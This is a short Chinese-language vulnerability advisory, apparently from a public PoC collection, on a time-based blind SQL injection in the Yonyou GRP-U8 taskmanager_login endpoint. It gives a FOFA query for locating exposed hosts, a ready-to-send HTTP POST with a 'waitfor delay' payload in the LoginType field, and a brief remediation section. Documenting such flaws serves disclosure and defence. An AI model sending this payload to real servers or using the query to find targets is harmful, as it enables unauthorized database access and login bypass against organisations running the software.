---
fofa: "app=\"用友-GRP-U8\""
source: "I-Wanna-Get-All/R4gd0ll"
---

# 用友 GRP-U8 taskmanager_login SQL注入漏洞

# 漏洞描述

用友 GRP-U8 /TaskManager/taskmanager_login 登录接口存在 SQL 注入漏洞。攻击者可在登录表单字段中注入时间盲注语句执行任意 SQL，获取数据库敏感信息或绕过登录限制。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
POST /TaskManager/taskmanager_login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

zUserNameText=admin&UserPassText=abc&LoginType=;waitfor/**/+delay/**/+'0:0:5'--&submitAction=login
```

若响应延迟约 5 秒，则存在时间盲注；可进一步构造 MSSQL 报错/联合注入语句提取数据。

# 漏洞修复

联系用友官方获取安全补丁，对登录表单各参数使用预编译语句并做严格过滤。
